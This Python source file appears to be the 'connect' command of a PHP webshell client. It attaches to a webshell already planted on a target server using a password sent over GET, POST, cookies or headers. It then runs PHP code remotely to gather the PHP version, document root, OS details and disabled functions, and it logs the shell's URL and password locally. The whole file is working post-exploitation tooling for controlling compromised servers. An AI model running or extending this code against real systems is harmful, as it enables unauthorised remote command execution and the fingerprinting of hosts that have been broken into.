from libs.config import alias, gset, gget, color, set_namespace
from libs.myapp import send, print_webshell_info
from os import path
from urllib.parse import urlparse


@alias(True, "c", u="url", m="method", p="pwd")
def run(url: str, method: str = "GET", pwd: str = "pass", *encode_functions):
    """
    connect

    Connect a webshell of php.

    eg: connect {url} {method} {pass} {encoders...}
    """
    method = str(method).upper()
    params_dict = {}
    if method == "GET":
        raw_key = "params"
    elif method == "POST":
        raw_key = "data"
    elif method == "COOKIE":
        raw_key = "cookies"
    elif method == "HEADER":
        raw_key = "headers"
    else:
        print(color.red("Method error"))
        return
    encode_functions = [str(f) for f in encode_functions]
    params_dict[raw_key] = {}
    webshell_netloc = urlparse(url).netloc
    gset("url", url, namespace="webshell")
    gset("webshell.params_dict", params_dict, namespace="webshell")
    gset("webshell.password", pwd, namespace="webshell")
    gset("webshell.method", raw_key, namespace="webshell")
    gset("webshell.encode_functions", encode_functions, namespace="webshell")
    gset("webshell.netloc", webshell_netloc, namespace="webshell")
    gset(
        "webshell.download_path",
        path.join(gget("root_path"), "target", webshell_netloc),
        namespace="webshell",
    )
    req = send("print('c4ca4238a0b923820d|'.phpversion().'|cc509a6f75849b');", raw=True)
    if ('7.' in req.r_text):
        gset("webshell.v7", True, namespace="webshell")
    if "c4ca4238a0b923820d" in req.r_text:  # 验证是否成功连接
        gset("webshell.php_version", req.r_text.split("c4ca4238a0b923820d|")[1].split("|cc509a6f75849b")[0], namespace="webshell")
        info_req = send(
            "print($_SERVER['DOCUMENT_ROOT'].'|'.php_uname().'|'.ini_get('disable_functions'));"
        )
        info = info_req.r_text.strip().split("|")
        gset("webshell.root", info[0], namespace="webshell")
        gset("webshell.os_version", info[1], namespace="webshell")
        gset(
            "webshell.iswin",
            (True if "win" in info[1].lower() else False),
            namespace="webshell",
        )
        disable_function_list = [f.strip() for f in info[2].split(",")]
        if ('' in disable_function_list):
            disable_function_list.remove('')
        gset("webshell.disable_functions", disable_function_list, namespace="webshell")
        from_log = gget("webshell.from_log", "webshell")
        if not from_log:
            with open("webshell.log", "a+") as f:
                f.write(f"{url}|{method}|{pwd}|{'|'.join(encode_functions)}\n")
        else:
            gset("webshell.from_log", False, True, "webshell")
        print(color.cyan("Connect success...\n"))
        print_webshell_info()
        set_namespace("webshell")
        return True
    else:
        print(color.red("Connect failed..."))
        print(req.r_text)
        return False
